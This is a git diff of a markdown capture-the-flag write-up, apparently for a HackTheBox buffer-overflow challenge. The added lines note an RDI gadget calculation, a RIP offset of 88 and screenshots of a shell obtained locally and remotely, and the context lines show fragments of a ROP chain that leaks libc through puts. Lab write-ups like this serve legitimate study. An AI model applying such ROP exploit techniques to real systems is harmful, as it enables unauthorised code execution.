@@ -112,6 +112,19 @@ sh.interactive()
 padding + rdi_gadget + puts@got + puts@plt + sym.missile_launcher
 ```
 
+> GRAB RDI & calc it with base address
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/663da213-f5fd-4546-93dc-a37d075b06bd)
+
+```
+rdi_gadget = elf.address + ropper_rdi
+```
+
+> RIP Offset --> 88
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6b13e269-c74e-4545-a498-a1b9481ca215)
+
+
 > LEAK LIBC SNIPPET
 
 ```py
@@ -291,9 +304,17 @@ sh.sendlineafter(b':', pay)
 sh.interactive()
 ```
 
-> RESULT
+> TEST LOCALLY - GOT SHELL!
 
-![image](https://github.com/jon-brandy/hackthebox/assets/70703371/52e1d270-128a-4a2c-9d88-b48edcd6792a)
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f2065e38-aa4b-4ef0-9bd3-02466b501f18)
+
+
+> TEST REMOTELY
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/70d83856-72fe-4fe4-b351-a279ad10f342)
+
+
+10. Got the flag!
 
 
 ## FLAG
